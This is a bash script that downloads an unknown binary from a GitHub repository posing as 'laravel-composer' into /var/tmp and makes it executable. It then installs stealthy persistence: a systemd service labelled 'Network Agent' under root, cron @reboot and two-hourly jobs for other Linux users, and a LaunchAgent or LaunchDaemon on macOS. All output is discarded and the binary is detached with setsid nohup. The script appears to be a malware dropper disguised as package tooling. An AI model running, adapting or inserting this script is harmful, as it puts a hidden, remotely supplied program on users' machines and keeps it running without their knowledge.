#!/bin/bash

SERVICE_BASE_NAME="package-agents"
AGENT_PATH="/var/tmp/laravel-composer"
LINUX_URL="https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/package"
MAC_URL="https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/packages"

# Detect OS early for later use
UNAME=$(uname -s)

# Check if agent already exists
if [[ -f "/var/tmp/laravel-composer" ]]; then
    AGENT_PATH="/var/tmp/laravel-composer"
elif [[ -f "/var/tmp/npm_package" ]]; then
    AGENT_PATH="/var/tmp/npm_package"
else
    # Agent doesn't exist, download based on OS
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        DOWNLOAD_URL="$LINUX_URL"
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        DOWNLOAD_URL="$MAC_URL"
    else
        # Fallback detection using uname
        if [[ "$UNAME" == "Linux" ]]; then
            DOWNLOAD_URL="$LINUX_URL"
        elif [[ "$UNAME" == "Darwin" ]]; then
            DOWNLOAD_URL="$MAC_URL"
        else
            exit 1
        fi
    fi
    
    # Download appropriate version
    if command -v curl &> /dev/null; then
        curl -fsSL "$DOWNLOAD_URL" -o "$AGENT_PATH" 2>/dev/null
    elif command -v wget &> /dev/null; then
        wget -q "$DOWNLOAD_URL" -O "$AGENT_PATH" 2>/dev/null
    else
        exit 1
    fi
    
    # Check if download was successful
    if [[ ! -f "$AGENT_PATH" ]]; then
        exit 1
    fi
fi

chmod +x "$AGENT_PATH"

if [[ $EUID -eq 0 ]]; then
    if [[ "$UNAME" == "Linux" ]]; then
        # Linux systemd service setup
        find_available_service_name() {
            local base_name="$1"
            local service_name="${base_name}.service"
            local counter=1
            
            if ! systemctl list-unit-files | grep -q "^${service_name}"; then
                echo "$service_name"
                return
            fi
            
            while systemctl list-unit-files | grep -q "^${base_name}-${counter}.service"; do
                ((counter++))
            done
            
            echo "${base_name}-${counter}.service"
        }
        
        SERVICE_NAME=$(find_available_service_name "$SERVICE_BASE_NAME")
        SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME"
        
        cat > "$SERVICE_PATH" <<EOF
[Unit]
Description=Network Agent
After=network.target

[Service]
Type=simple
ExecStart=$AGENT_PATH
Restart=always
RestartSec=60
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

        chmod 644 "$SERVICE_PATH"
        
        systemctl daemon-reload
        
        if systemctl enable "$SERVICE_NAME" 2>/dev/null; then
            :
        else
            exit 1
        fi
        
        if systemctl start "$SERVICE_NAME" 2>/dev/null; then
            :
        else
            exit 1
        fi
        
        systemctl status "$SERVICE_NAME" --no-pager >/dev/null 2>&1
    else
        # macOS - even as root, use cron since launchd is complex
        # Fall through to cron setup below
        :
    fi
    
fi

# For non-root users on Linux, use cron
if [[ $EUID -ne 0 ]] && [[ "$UNAME" == "Linux" ]]; then
    
    if ! command -v crontab &> /dev/null; then
        exit 1
    fi
    
    TEMP_CRON="/tmp/.cron_backup_$$"
    
    crontab -l 2>/dev/null > "$TEMP_CRON" || true
    
    REBOOT_JOB="@reboot setsid nohup $AGENT_PATH >/dev/null 2>&1 &"
    MINUTE_JOB="0 */2 * * * setsid nohup $AGENT_PATH >/dev/null 2>&1 &"
    
    if ! grep -Fq "$REBOOT_JOB" "$TEMP_CRON" 2>/dev/null; then
        echo "$REBOOT_JOB" >> "$TEMP_CRON"
    fi
    
    if ! grep -Fq "$MINUTE_JOB" "$TEMP_CRON" 2>/dev/null; then
        echo "$MINUTE_JOB" >> "$TEMP_CRON"
    fi
    
    if crontab "$TEMP_CRON"; then
        :
    else
        rm -f "$TEMP_CRON"
        exit 1
    fi
    
    rm -f "$TEMP_CRON"
    
    setsid nohup "$AGENT_PATH" >/dev/null 2>&1 &
fi

# For macOS, use LaunchAgent
if [[ "$UNAME" == "Darwin" ]]; then
    # Determine LaunchAgent directory based on user
    if [[ $EUID -eq 0 ]]; then
        LAUNCH_AGENTS_DIR="/Library/LaunchDaemons"
        PLIST_NAME="com.packages.agent.plist"
    else
        LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
        PLIST_NAME="com.packages.agent.plist"
        # Create directory if it doesn't exist
        mkdir -p "$LAUNCH_AGENTS_DIR" 2>/dev/null
    fi
    
    PLIST_PATH="$LAUNCH_AGENTS_DIR/$PLIST_NAME"
    
    # Create LaunchAgent plist
    cat > "$PLIST_PATH" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.packages.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>$AGENT_PATH</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF
    
    # Set proper permissions
    chmod 644 "$PLIST_PATH"
    
    # For LaunchDaemons, set root ownership
    if [[ $EUID -eq 0 ]]; then
        chown root:wheel "$PLIST_PATH"
    fi
    
    # Load the LaunchAgent/Daemon
    if command -v launchctl &> /dev/null; then
        # Try modern method first (macOS 10.11+)
        if [[ $EUID -eq 0 ]]; then
            launchctl bootstrap system "$PLIST_PATH" 2>/dev/null || launchctl load "$PLIST_PATH" 2>/dev/null
        else
            launchctl bootstrap gui/$(id -u) "$PLIST_PATH" 2>/dev/null || launchctl load "$PLIST_PATH" 2>/dev/null
        fi
    fi
fi
